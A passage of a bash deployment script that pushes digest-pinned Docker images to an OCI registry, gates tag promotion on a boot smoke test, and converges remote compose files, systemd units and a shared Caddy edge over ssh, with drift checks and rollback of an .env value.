    quoted_args+=" $(remote_quote "${arg}")"
  done
  ssh -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
    -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
    -l "${OCI_USER}" -- "${OCI_HOST}" \
    "DOCKER_CONFIG=${config_q} exec docker${quoted_args}"
}

# Push a single fully-qualified image ref, honoring local vs remote-build mode.
_push_ref() {
  local ref="$1" timeout rc=0
  assert_safe_image_repo "push image ref" "${ref}"
  timeout="${ACX_PUSH_TIMEOUT:-900}"
  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_PUSH_TIMEOUT must be a positive integer (got: ${timeout})"
  fi
  if [[ "${REMOTE_BUILD}" == "1" ]]; then
    run_with_deadline "${timeout}" "push of ${ref}" remote_docker_with_config push "${ref}" || rc=$?
  else
    run_with_deadline "${timeout}" "push of ${ref}" local_docker_with_config push "${ref}" || rc=$?
  fi
  return "${rc}"
}

# Pull one fully-qualified image ref with the same wall-clock bound as pushes.
# The build-host variant follows REMOTE_BUILD; the remote-only variant is used
# for smoke/restart/rollback, which always materialise bytes on the target VM.
_pull_ref() {
  local ref="$1" timeout rc=0
  assert_safe_image_ref "pull image ref" "${ref}"
  timeout="${ACX_PULL_TIMEOUT:-900}"
  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_PULL_TIMEOUT must be a positive integer (got: ${timeout})"
  fi
  if [[ "${REMOTE_BUILD}" == "1" ]]; then
    run_with_deadline "${timeout}" "pull of ${ref}" remote_docker_with_config pull "${ref}" || rc=$?
  else
    run_with_deadline "${timeout}" "pull of ${ref}" local_docker_with_config pull "${ref}" || rc=$?
  fi
  return "${rc}"
}

_pull_ref_remote() {
  local ref="$1" timeout rc=0
  assert_safe_image_ref "remote pull image ref" "${ref}"
  timeout="${ACX_PULL_TIMEOUT:-900}"
  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_PULL_TIMEOUT must be a positive integer (got: ${timeout})"
  fi
  run_with_deadline "${timeout}" "remote pull of ${ref}" remote_docker_with_config pull "${ref}" || rc=$?
  return "${rc}"
}

# Read the registry digest recorded on the just-pushed local/remote image.
image_digest_ref() {
  local ref="$1" output digest_ref timeout rc=0
  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
  if [[ "${REMOTE_BUILD}" == "1" ]]; then
    output="$(run_with_deadline "${timeout}" "remote image digest inspection for ${ref}" \
      remote_docker_with_config image inspect --format '{{range .RepoDigests}}{{println .}}{{end}}' "${ref}")" || rc=$?
  else
    output="$(run_with_deadline "${timeout}" "local image digest inspection for ${ref}" \
      local_docker_with_config image inspect --format '{{range .RepoDigests}}{{println .}}{{end}}' "${ref}")" || rc=$?
  fi
  (( rc == 0 )) || return "${rc}"
  digest_ref="$(printf '%s\n' "${output}" | awk -v repo="${IMAGE_BASE}@sha256:" 'index($0, repo) == 1 { print; exit }')"
  if [[ ! "${digest_ref}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
    warn "Could not resolve a sha256 registry digest for ${ref} (got: ${digest_ref:-empty})"
    return 1
  fi
  printf '%s\n' "${digest_ref}"
}

remote_image_digest_ref() {
  local ref="$1" output digest_ref timeout rc=0 repo
  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
  output="$(run_with_deadline "${timeout}" "remote image digest inspection for ${ref}" \
    remote_docker_with_config image inspect --format '{{range .RepoDigests}}{{println .}}{{end}}' "${ref}")" || rc=$?
  (( rc == 0 )) || return "${rc}"
  if [[ "${ref}" == *@sha256:* ]]; then
    repo="${ref%@sha256:*}"
  elif [[ "${ref##*/}" == *:* ]]; then
    repo="${ref%:*}"
  else
    repo="${ref}"
  fi
  digest_ref="$(printf '%s\n' "${output}" | awk -v repo="${repo}@sha256:" 'index($0, repo) == 1 { print; exit }')"
  if [[ ! "${digest_ref}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
    warn "Could not resolve a remote sha256 registry digest for ${ref} (got: ${digest_ref:-empty})"
    return 1
  fi
  printf '%s\n' "${digest_ref}"
}

remote_image_id_for_digest() {
  local digest_ref="$1" timeout image_id rc=0
  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
  image_id="$(run_with_deadline "${timeout}" "remote immutable image ID inspection for ${digest_ref}" \
    remote_docker_with_config image inspect --format '{{.Id}}' "${digest_ref}")" || rc=$?
  if (( rc != 0 )) || [[ ! "${image_id}" =~ ^sha256:[a-f0-9]{64}$ ]]; then
    return 1
  fi
  printf '%s\n' "${image_id}"
}

# A local RepoDigests entry describes a cached image object, not necessarily the
# registry's current mutable-tag mapping. Pull the tag after the push and only
# then inspect what the registry returned (read-after-write evidence).
registry_tag_digest_ref() {
  local ref="$1"
  _pull_ref "${ref}" >/dev/null || return
  image_digest_ref "${ref}"
}

# Push the SHA-named tag, then capture its content digest.  The tag remains
# mutable; only ACX_CANDIDATE_DIGEST_REF is used by smoke and promotion.
do_push_sha() {
  local sha; sha="$(git -C "${REPO_ROOT}" rev-parse "${GIT_REF}")"
  if [[ "${REMOTE_BUILD}" == "1" ]]; then preflight_remote_ocir_auth; else preflight_ocir_auth; fi
  log "Pushing ${IMAGE_BASE}:${sha:0:8}"
  _push_ref "${IMAGE_BASE}:${sha}"
  ACX_CANDIDATE_DIGEST_REF="$(image_digest_ref "${IMAGE_BASE}:${sha}")" \
    || fail "SHA-named tag was pushed but its registry digest could not be captured"
  log "Candidate digest fence: ${ACX_CANDIDATE_DIGEST_REF}"
}

# Promote the env tag (e.g. :latest for prod). Called ONLY after the boot smoke
# passes, so a bad image never poisons the env tag in OCIR.
do_push_tag() {
  local tag="$1" source_digest="${2:-${ACX_CANDIDATE_DIGEST_REF:-}}" promoted_digest
  assert_safe_shell_token "image tag" "${tag}"
  assert_safe_image_repo "IMAGE_BASE" "${IMAGE_BASE}"
  if [[ ! "${source_digest}" =~ ^${IMAGE_BASE}@sha256:[a-f0-9]{64}$ ]]; then
    warn "refusing tag promotion without a valid candidate digest: ${source_digest:-empty}"
    return 1
  fi
  log "Promoting ${source_digest} -> ${IMAGE_BASE}:${tag} in OCIR"
  _pull_ref "${source_digest}" || return
  if [[ "${REMOTE_BUILD}" == "1" ]]; then
    remote_docker_with_config tag "${source_digest}" "${IMAGE_BASE}:${tag}" || return
  else
    local_docker_with_config tag "${source_digest}" "${IMAGE_BASE}:${tag}" || return
  fi
  if ! _push_ref "${IMAGE_BASE}:${tag}"; then
    warn "push of ${IMAGE_BASE}:${tag} failed"
    return 1
  fi
  promoted_digest="$(registry_tag_digest_ref "${IMAGE_BASE}:${tag}")" || return
  if [[ "${promoted_digest}" != "${source_digest}" ]]; then
    warn "DIGEST MISMATCH: smoke fenced ${source_digest}, but promotion resolved ${promoted_digest}"
    return 1
  fi
}

# Shared pre-restart safety gate for <env> on candidate digest: boot-smoke the
# candidate (abort on failure), ship ACX_IMAGE_REPO
# into remote .env (before any env-tag promotion), converge compose+unit.
# Used by both do_deploy and do_promote so the prod path is uniform.
promote_gate() {
  local env="$1" image="$2" remote_dir prior_rc=0
  remote_dir="$(env_to_remote_dir "$env")"
  if [[ ! "${image}" =~ ^${IMAGE_BASE}@sha256:[a-f0-9]{64}$ ]]; then
    fail "promote gate requires a digest-pinned candidate (got: ${image})"
  fi
  if [[ "${ACX_BOOT_SMOKE:-1}" == "1" ]]; then
    if ! do_boot_smoke "$env" "$image"; then
      fail "Pre-promote boot smoke failed for ${env} (${image}); prod left on the old image (no restart). Fix the build and re-run, or set ACX_BOOT_SMOKE=0 to bypass."
    fi
  else
    warn "ACX_BOOT_SMOKE=0: skipping pre-promote boot smoke"
  fi

  # D6 / S2-A-06: ship ACX_IMAGE_REPO exactly once here (before env-tag promotion)
  # so a ship failure never leaves OCIR :latest pointing at an image whose remote
  # .env never updated, and so converge_runtime / do_restart do not rewrite .env
  # again (three independent mid-rewrite windows). Snapshot prior value for restore.
  # Runs even when ACX_CONVERGE_RUNTIME=0 (image-only path).
  ACX_PRIOR_IMAGE_REPO="$(read_remote_image_repo "$env")" || prior_rc=$?
  ACX_PRIOR_IMAGE_REPO_ENV="$env"
  if (( prior_rc != 0 )); then
    warn "Could not observe prior ACX_IMAGE_REPO on ${env}; refusing to overwrite unknown state"
    return "${prior_rc}"
  fi
  if [[ "${ACX_PRIOR_IMAGE_REPO}" == "__INVALID_REPO__" ]]; then
    fail "remote ACX_IMAGE_REPO on ${env} failed charset validation; refusing to deploy over a hostile/malformed sticky repo"
  fi
  if ! ship_remote_image_repo_env "${remote_dir}"; then
    warn "Shipping ACX_IMAGE_REPO failed for ${env}; restoring the prior sticky repository"
    restore_prior_image_repo_env
    return 1
  fi

  if [[ "${ACX_CONVERGE_RUNTIME:-1}" == "1" ]]; then
    # converge_runtime contains fail-fast exits. Run it in a subshell so a
    # failure returns control to this transaction boundary and the sticky repo
    # can be compensated before the deploy exits.
    if ! (converge_runtime "$env"); then
      warn "Runtime convergence failed for ${env}; restoring the prior sticky repository"
      restore_prior_image_repo_env
      return 1
    fi
  else
    # HARM-A-06: image-only hotfix must not land on a compose/unit topology that
    # differs from the repo (Gate 2 smokes the NEW topology; stale VM compose would
    # not receive those mounts). Refuse ACX_CONVERGE_RUNTIME=0 when drift exists.
    if ! runtime_in_sync "$env"; then
      warn "ACX_CONVERGE_RUNTIME=0 refused for ${env}: deployed compose/unit drifts from repo"
      restore_prior_image_repo_env
      return 1
    fi
    warn "ACX_CONVERGE_RUNTIME=0: skipping compose+unit convergence (image-only restart; topology matches repo)"
  fi
}

# Restore sticky ACX_IMAGE_REPO after a post-ship failure (S2-A-06). Empty prior
# means the key was absent — clear it rather than leave the newly shipped value.
restore_prior_image_repo_env() {
  local env="${ACX_PRIOR_IMAGE_REPO_ENV:-}" prior="${ACX_PRIOR_IMAGE_REPO:-}"
  [[ -n "${env}" ]] || return 0
  if [[ -z "${prior}" || "${prior}" == "__INVALID_REPO__" ]]; then
    warn "Restoring prior ACX_IMAGE_REPO on ${env}: key was absent — clearing sticky repo"
    clear_remote_image_repo_env "$env"
    return
  fi
  warn "Restoring prior ACX_IMAGE_REPO=${prior} on ${env} after post-ship failure"
  ACX_IMAGE_REPO="${prior}" ship_remote_image_repo_env "$(env_to_remote_dir "$env")"
}

# Read-only topology match (same diffs as converge_check) but returns 1 on drift
# instead of calling fail() — usable under ACX_CONVERGE_RUNTIME=0 refuse path.
runtime_in_sync() {
  local env="$1" remote_dir unit rendered
  remote_dir="$(env_to_remote_dir "$env")"
  unit="$(env_to_unit "$env")"
  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '${remote_dir}/docker-compose.env.yml' 2>/dev/null" \
       | diff -q - "${SERVICE_DIR}/docker-compose.env.yml" >/dev/null 2>&1; then
    return 1
  fi
  if [[ "$env" == "prod" ]]; then
    if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '${remote_dir}/docker-compose.admin.yml' 2>/dev/null" \
         | diff -q - "${SERVICE_DIR}/docker-compose.admin.yml" >/dev/null 2>&1; then
      return 1
    fi
  fi
  rendered="$(render_unit "$env")"
  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '/etc/systemd/system/${unit}.service' 2>/dev/null" \
       | diff -q - <(printf '%s\n' "$rendered") >/dev/null 2>&1; then
    return 1
  fi
  return 0
}

env_to_compose_files() {
  case "$1" in
    prod)                 echo "-f docker-compose.env.yml -f docker-compose.admin.yml" ;;
    dev|dev-fir|staging)  echo "-f docker-compose.env.yml" ;;
    *)                    fail "Unknown env: $1" ;;
  esac
}

# Render the systemd unit for <env> from the checked-in template to stdout.
render_unit() {
  local env="$1" compose_files
  compose_files="$(env_to_compose_files "$env")"
  sed -e "s/{{ENV}}/${env}/g" -e "s|{{COMPOSE_FILES}}|${compose_files}|g" \
    "${SERVICE_DIR}/systemd/acx-env.service.template"
}

# Write ACX_IMAGE_REPO into the remote env .env so compose substitutes the same
# repository resolve_image_repo_name() selected for build/push (variant parity).
# D6: use sudo (secrets .env is often root-owned) and ensure a trailing newline
# before append so we never concatenate onto the previous secret line.
ship_remote_image_repo_env() {
  local remote_dir="$1" env_file timeout
  env_file="${remote_dir}/.env"
  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
  assert_safe_image_repo "ACX_IMAGE_REPO" "${ACX_IMAGE_REPO}"
  log "Shipping ACX_IMAGE_REPO=${ACX_IMAGE_REPO} into ${env_file} on ${SSH_TARGET}"
  # Upsert the key without rewriting other secrets. Value is charset-validated OCIR path.
  # Remote path env_file is from env_to_remote_dir (fixed allowlist); value is validated above.
  run_with_deadline "${timeout}" "shipping ACX_IMAGE_REPO to ${remote_dir}" \
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
    "f='${env_file}'; v='${ACX_IMAGE_REPO}'; \
     sudo test -e \"\$f\" || sudo touch \"\$f\"; \
     if sudo test -s \"\$f\" && [ \"\$(sudo tail -c1 \"\$f\" | wc -l)\" -eq 0 ]; then \
       printf '\\n' | sudo tee -a \"\$f\" >/dev/null; \
     fi; \
     if sudo grep -q '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null; then \
       sudo sed -i \"s|^ACX_IMAGE_REPO=.*|ACX_IMAGE_REPO=\${v}|\" \"\$f\"; \
     else \
       printf 'ACX_IMAGE_REPO=%s\\n' \"\$v\" | sudo tee -a \"\$f\" >/dev/null; \
     fi"
}

# D9: remove sticky ACX_IMAGE_REPO from remote .env so compose falls back to the
# recognition default (${OCIR}/.../acx-backend). Does not restart the unit —
# operator restarts or re-deploys after clearing.
clear_remote_image_repo_env() {
  local env="$1" remote_dir env_file timeout
  remote_dir="$(env_to_remote_dir "$env")"
  env_file="${remote_dir}/.env"
  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
  # S2-A-10: prod sticky-repo clear is latent (no restart) — require CONFIRM=PROMOTE.
  if [[ "$env" == "prod" && "${CONFIRM:-}" != "PROMOTE" ]]; then
    fail "clear-image-repo prod requires CONFIRM=PROMOTE (sticky-repo clear is latent until next unit restart). Re-run: CONFIRM=PROMOTE $0 clear-image-repo prod"
  fi
  preflight_ssh
  log "Removing ACX_IMAGE_REPO from ${env_file} on ${SSH_TARGET} (compose → recognition default)"
  run_with_deadline "${timeout}" "clearing ACX_IMAGE_REPO from ${remote_dir}" \
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
    "f='${env_file}'; \
     if sudo test -f \"\$f\" && sudo grep -q '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null; then \
       sudo sed -i '/^ACX_IMAGE_REPO=/d' \"\$f\"; \
       echo 'removed ACX_IMAGE_REPO'; \
     else \
       echo 'ACX_IMAGE_REPO not present (already default)'; \
     fi"
  log "clear-image-repo done for ${env}. Restart the unit (or re-deploy) to pick up the recognition default."
}

# Converge the deployed compose file(s) + systemd unit + shared Caddy edge with
# the repo *before* the image restart, so drift (missing volume/env/overlay or a
# stale Caddyfile) cannot reach a live env. Backs up the prior compose/unit/
# edge on the VM first.
#
# Edge policy (C-08/C-12, FL30C-GATE-01/02):
#   - Shared multi-env edge at /opt/acx-backend — shipping it is correct, but
#     unbounded `compose up -d` recreates the container that serves prod on
#     every env's converge. Bound it: checksum-compare deployed vs repo; no-op
#     when both match; prefer `caddy reload` when only the Caddyfile changed;
#     reserve `docker compose up -d` for compose-level changes (network joins).
#   - acx-dev-fir-net is external:true on docker-compose.caddy.yml (must not be
#     compose-owned — label collision with env stack's `backend` key). Ensure
#     the network exists idempotently before any compose up so fir-absent
#     demo/dev deploys still succeed. Labels match the fir stack's declaring
#     key/project so a later fir `compose up` can adopt the pre-created net.
converge_runtime() {
  local env="$1" remote_dir unit edge_dir
  local repo_caddy_sum repo_compose_sum remote_caddy_sum remote_compose_sum
  local edge_caddy_drift=0 edge_compose_drift=0
  local edge_apply_edge=0
  # Must match ACX_NETWORK_NAME in .env.fir.example and the external network
  # key on docker-compose.caddy.yml (shared edge hardcodes the name).
  local fir_net="acx-dev-fir-net"
  remote_dir="$(env_to_remote_dir "$env")"
  unit="$(env_to_unit "$env")"
  edge_dir="/opt/acx-backend"
  log "Converging compose + unit + caddy edge for ${env} on ${SSH_TARGET}"
  # Ship via /tmp + sudo cp (same pattern as the unit file): the deployed
  # files can be root-owned (the E15-29 admin overlay was installed via sudo),
  # so a plain scp to the final path fails with Permission denied.
  _ship_file() {
    local src="$1" dest="$2" name; name="$(basename "$dest")"
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat > '/tmp/${name}' && sudo cp '/tmp/${name}' '${dest}' && rm -f '/tmp/${name}'" < "$src"
  }

  # ---- Edge probes + gate FIRST (before any remote mutation) --------------
  # Ordering invariant (gate r08117ab7 RB-02): an ACX_EDGE_APPLY refusal must
  # leave zero partial remote state — no env compose ship, no unit ship, no
  # daemon-reload. Probe checksums + membership and decide the gate before
  # any file is written.
  #
  # Shared multi-env Caddy edge — mutate only when repo content differs.
  # Local hashing must use the same Linux/macOS fallback as verify_model_hashes;
  # sha256sum is absent on macOS before 15 and `set -e` would abort the deploy.
  repo_caddy_sum="$(_local_sha256 "${SERVICE_DIR}/Caddyfile")"
  repo_compose_sum="$(_local_sha256 "${SERVICE_DIR}/docker-compose.caddy.yml")"
  # A transport failure must fail the converge, not read as drift: an empty
  # checksum from ssh exit!=0 would flip edge_*_drift=1 and recreate the
  # prod-serving edge off a network blip (gate r0811864a B-03). The remote
  # command itself exits 0 even when the file is missing (awk terminates the
  # pipe), so a nonzero rc here is ssh/transport, not "file absent".
  local edge_sum_rc=0
  remote_caddy_sum="$(ssh -l "${OCI_USER}" -- "${OCI_HOST}" "sha256sum '${edge_dir}/Caddyfile' 2>/dev/null | awk '{print \$1}'")" || edge_sum_rc=$?
  if (( edge_sum_rc != 0 )); then
    fail "cannot read remote edge checksums on ${SSH_TARGET} (ssh exit ${edge_sum_rc}); refusing to treat transport failure as edge drift"
  fi
  remote_compose_sum="$(ssh -l "${OCI_USER}" -- "${OCI_HOST}" "sha256sum '${edge_dir}/docker-compose.caddy.yml' 2>/dev/null | awk '{print \$1}'")" || edge_sum_rc=$?
  if (( edge_sum_rc != 0 )); then
    fail "cannot read remote edge checksums on ${SSH_TARGET} (ssh exit ${edge_sum_rc}); refusing to treat transport failure as edge drift"
  fi
  [[ "${remote_caddy_sum}" == "${repo_caddy_sum}" ]] || edge_caddy_drift=1
  [[ "${remote_compose_sum}" == "${repo_compose_sum}" ]] || edge_compose_drift=1

  # Checksum parity alone misses network-membership drift: `caddy reload` /
  # matching compose files never attach newly-declared networks to a RUNNING
  # container, so a caddy predating acx-dev-fir-net looks converged while
  # fir.dev.api 502s (gate r0811864a G2-03). Inspect the live container and
  # escalate a missing membership to compose-level drift (recreate path).
  local edge_membership edge_member_rc=0
  edge_membership="$(ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cd '${edge_dir}' && cid=\$(docker compose -f docker-compose.caddy.yml ps -q caddy 2>/dev/null); if [ -z \"\$cid\" ]; then echo NOCADDY; elif docker inspect -f '{{json .NetworkSettings.Networks}}' \"\$cid\" | grep -q '\"${fir_net}\"'; then echo MEMBER; else echo MISSING; fi")" || edge_member_rc=$?
  if (( edge_member_rc != 0 )); then
    fail "cannot inspect caddy edge network membership on ${SSH_TARGET} (ssh exit ${edge_member_rc}); refusing to converge edge blind"
  fi
  if [[ "${edge_membership}" != "MEMBER" ]]; then
    log "caddy edge container is not attached to ${fir_net} (${edge_membership}); marking compose-level edge drift"
    edge_compose_drift=1
  fi

  if (( edge_caddy_drift != 0 || edge_compose_drift != 0 )); then
    # Scoping (gate r08117ab7 RA-02/RB-02):
    #   - dev-fir: edge IS fir's ingress → fail-closed without ACX_EDGE_APPLY=1
    #   - any other env: warn + skip edge so prod/staging hotfixes are not
    #     coupled to FIR edge state; env runtime still converges
    #   - ACX_EDGE_APPLY=1: any env may converge the edge
    if [[ "${ACX_EDGE_APPLY:-0}" == "1" ]]; then
      edge_apply_edge=1
    elif [[ "$env" == "dev-fir" ]]; then
      fail "caddy edge drift detected for ${env} (caddyfile_drift=${edge_caddy_drift} compose_drift=${edge_compose_drift} membership=${edge_membership}). Applying may reload/recreate the shared prod-serving edge. Re-run with ACX_EDGE_APPLY=1 to converge the edge, or ACX_CONVERGE_RUNTIME=0 to skip convergence entirely."
    else
      warn "edge drift present, skipping edge convergence; run deploy dev-fir with ACX_EDGE_APPLY=1 to converge"
    fi
  fi

  # ---- Env runtime mutation (only after gate decision) --------------------
  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cp -f '${remote_dir}/docker-compose.env.yml' '${remote_dir}/docker-compose.env.yml.bak' 2>/dev/null || true; sudo cp -f '/etc/systemd/system/${unit}.service' '/etc/systemd/system/${unit}.service.bak' 2>/dev/null || true"
  _ship_file "${SERVICE_DIR}/docker-compose.env.yml" "${remote_dir}/docker-compose.env.yml"
  if [[ "$env" == "prod" ]]; then
    # Back up the admin overlay too so a bad overlay is restorable from *.bak.
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cp -f '${remote_dir}/docker-compose.admin.yml' '${remote_dir}/docker-compose.admin.yml.bak' 2>/dev/null || true"
    _ship_file "${SERVICE_DIR}/docker-compose.admin.yml" "${remote_dir}/docker-compose.admin.yml"
  fi
  # ACX_IMAGE_REPO is shipped once in promote_gate (S2-A-06) — not re-written here.
  render_unit "$env" | ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat > '/tmp/${unit}.service' && sudo cp '/tmp/${unit}.service' '/etc/systemd/system/${unit}.service' && rm -f '/tmp/${unit}.service' && sudo systemctl daemon-reload"

  # ---- Edge mutation (only when gated in) ---------------------------------
  if (( edge_apply_edge == 0 )); then
    if (( edge_caddy_drift == 0 && edge_compose_drift == 0 )); then
      log "Caddy edge already matches repo; skipping ship/reload for ${env}"
      log "Runtime converged for ${env} (compose + unit match repo; edge unchanged)"
    else
      log "Runtime converged for ${env} (compose + unit match repo; edge skipped)"
    fi
    return 0
  fi

  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cp -f '${edge_dir}/Caddyfile' '${edge_dir}/Caddyfile.bak' 2>/dev/null || true; cp -f '${edge_dir}/docker-compose.caddy.yml' '${edge_dir}/docker-compose.caddy.yml.bak' 2>/dev/null || true"
  if (( edge_caddy_drift )); then
    _ship_file "${SERVICE_DIR}/Caddyfile" "${edge_dir}/Caddyfile"
  fi
  if (( edge_compose_drift )); then
    _ship_file "${SERVICE_DIR}/docker-compose.caddy.yml" "${edge_dir}/docker-compose.caddy.yml"
  fi
  # Build only the apply path we need so a Caddyfile-only converge does not
  # even mention `compose up -d` except as reload fallback (FL30C-GATE-02).
  local edge_apply
  if (( edge_compose_drift )); then
    # Compose-level change (network membership etc.) needs container recreate.
    edge_apply="docker compose -f docker-compose.caddy.yml up -d"
  else
    # Caddyfile-only: reload in-place; fall back to up -d if container is down.
    edge_apply="docker compose -f docker-compose.caddy.yml exec -T caddy caddy reload --config /etc/caddy/Caddyfile || docker compose -f docker-compose.caddy.yml up -d"
  fi
  # Expand locals into the remote script (fir_net / edge_apply).
  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "bash -s" <<EDGE
set -euo pipefail
cd /opt/acx-backend
# FL30C-GATE-01: acx-dev-fir-net is external on the shared compose; create it
# if the fir stack has never stood it up. Labels match docker-compose.env.yml's
# declaring key (backend) + COMPOSE_PROJECT_NAME=acx-dev-fir so fir can adopt.
if ! docker network inspect '${fir_net}' >/dev/null 2>&1; then
  docker network create \\
    --label com.docker.compose.network=backend \\
    --label com.docker.compose.project=acx-dev-fir \\
    '${fir_net}'
fi
# Validate before applying (syntax-only; catch bad Caddyfile before reload/up).
docker run --rm \\
  -v /opt/acx-backend/Caddyfile:/etc/caddy/Caddyfile:ro \\
  caddy:2-alpine \\
  caddy validate --config /etc/caddy/Caddyfile
${edge_apply}
EDGE
  log "Runtime converged for ${env} (compose + unit + caddy edge match repo)"
}

# Read-only drift gate: diff the deployed compose/unit against the repo and exit
# non-zero on any drift, without mutating the VM. Operator triage for `--check`.
# Transport failures must never be misread as drift (gate r08117ab7 RA-03/RB-04):
# each arm captures the ssh exit status before diffing; ssh rc=255 → fail with a
# transport-error message. Missing remote files (cat exit 1) still count as drift.
converge_check() {
  local env="$1" remote_dir unit drift=0 rendered
  local remote_tmp ssh_rc fir_net="acx-dev-fir-net"
  remote_dir="$(env_to_remote_dir "$env")"
  unit="$(env_to_unit "$env")"
  log "Checking runtime drift for ${env} on ${SSH_TARGET} (read-only)"
  remote_tmp="$(mktemp)"
  # shellcheck disable=SC2064
  trap "rm -f '${remote_tmp}'" RETURN
  # fail() calls `exit 1`, which does NOT run RETURN traps — every abort path
  # must rm explicitly or --check leaks /tmp/tmp.* (gate r0811e5db V-02).
  _cc_fail() {
    rm -f "${remote_tmp}"
    fail "$@"
  }

  _check_remote_file() {
    # Fetch remote path into remote_tmp; compare to local. Sets drift on
    # content/missing-file mismatch. Aborts on ssh transport failure.
    local remote_path="$1" local_path="$2" label="$3"
    ssh_rc=0
    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '${remote_path}'" >"${remote_tmp}" 2>/dev/null || ssh_rc=$?
    if (( ssh_rc == 255 )); then
      _cc_fail "cannot read remote ${label} on ${SSH_TARGET} (ssh exit ${ssh_rc}); refusing to treat transport failure as runtime drift"
    fi
    if (( ssh_rc != 0 )); then
      # Non-transport failure (typically cat exit 1 = missing file) → drift.
      warn "drift: ${label} on ${env} differs from repo (or is missing)"; drift=1
      return 0
    fi
    if ! diff -u "${remote_tmp}" "${local_path}" >/dev/null; then
      diff -u "${remote_tmp}" "${local_path}" || true
      warn "drift: ${label} on ${env} differs from repo (or is missing)"; drift=1
    fi
  }

  _check_remote_file \
    "${remote_dir}/docker-compose.env.yml" \
    "${SERVICE_DIR}/docker-compose.env.yml" \
    "docker-compose.env.yml"
  if [[ "$env" == "prod" ]]; then
    _check_remote_file \
      "${remote_dir}/docker-compose.admin.yml" \
      "${SERVICE_DIR}/docker-compose.admin.yml" \
      "docker-compose.admin.yml"
  fi
  rendered="$(render_unit "$env")"
  ssh_rc=0
  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '/etc/systemd/system/${unit}.service'" >"${remote_tmp}" 2>/dev/null || ssh_rc=$?
  if (( ssh_rc == 255 )); then
    _cc_fail "cannot read remote ${unit}.service on ${SSH_TARGET} (ssh exit ${ssh_rc}); refusing to treat transport failure as runtime drift"
  elif (( ssh_rc != 0 )); then
    warn "drift: ${unit}.service on ${env} differs from repo template (or is missing)"; drift=1
  elif ! diff -u "${remote_tmp}" <(printf '%s\n' "$rendered") >/dev/null; then
    diff -u "${remote_tmp}" <(printf '%s\n' "$rendered") || true
    warn "drift: ${unit}.service on ${env} differs from repo template (or is missing)"; drift=1
  fi
  # Edge drift arm: converge_runtime now owns the shared caddy edge, so the
  # read-only gate must surface edge drift too or --check reports clean while
  # FIR routing / caddy net membership is stale (gate r0811864a B-04).
  local edge_dir="/opt/acx-backend"
  _check_remote_file \
    "${edge_dir}/Caddyfile" \
    "${SERVICE_DIR}/Caddyfile" \
    "shared edge Caddyfile"
  _check_remote_file \
    "${edge_dir}/docker-compose.caddy.yml" \
    "${SERVICE_DIR}/docker-compose.caddy.yml" \
    "shared edge docker-compose.caddy.yml"
  # Membership probe (gate r08117ab7 RB-01/RC-01): matching Caddyfile + compose
  # files never attach newly-declared networks to a RUNNING container. Mirror
  # converge_runtime's MEMBER|MISSING|NOCADDY inspect so --check catches the
  # fir-502 case (caddy never recreated onto acx-dev-fir-net).
  local edge_membership edge_member_rc=0
  edge_membership="$(ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cd '${edge_dir}' && cid=\$(docker compose -f docker-compose.caddy.yml ps -q caddy 2>/dev/null); if [ -z \"\$cid\" ]; then echo NOCADDY; elif docker inspect -f '{{json .NetworkSettings.Networks}}' \"\$cid\" | grep -q '\"${fir_net}\"'; then echo MEMBER; else echo MISSING; fi")" || edge_member_rc=$?
  if (( edge_member_rc != 0 )); then
    _cc_fail "cannot inspect caddy edge network membership on ${SSH_TARGET} (ssh exit ${edge_member_rc}); refusing to treat transport failure as runtime drift"
  fi
  if [[ "${edge_membership}" != "MEMBER" ]]; then
    warn "drift: caddy edge container is not attached to ${fir_net} (${edge_membership})"; drift=1
  fi
  if (( drift )); then
    _cc_fail "runtime drift detected for ${env}; run '$0 deploy ${env}' to converge"
  fi
  log "no runtime drift for ${env} (compose + unit match repo)"
}

# Return the immutable image ID of the api container that is actually serving
# the environment. Config.Image is only the mutable compose tag and therefore
# cannot establish rollback provenance.
read_running_api_image_id() {
  local env="$1" remote_dir compose_files remote_dir_q timeout image_id rc=0
  remote_dir="$(env_to_remote_dir "${env}")"
  compose_files="$(env_to_compose_files "${env}")"
  remote_dir_q="$(remote_quote "${remote_dir}")"
  timeout="${ACX_REMOTE_INSPECT_TIMEOUT:-60}"
  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_REMOTE_INSPECT_TIMEOUT must be a positive integer (got: ${timeout})"
  fi
  # shellcheck disable=SC2086 # compose_files is intentionally word-split remotely.
  image_id="$(run_with_deadline "${timeout}" "running image inspection for ${env}" \
    ssh -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
      -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
      -l "${OCI_USER}" -- "${OCI_HOST}" \
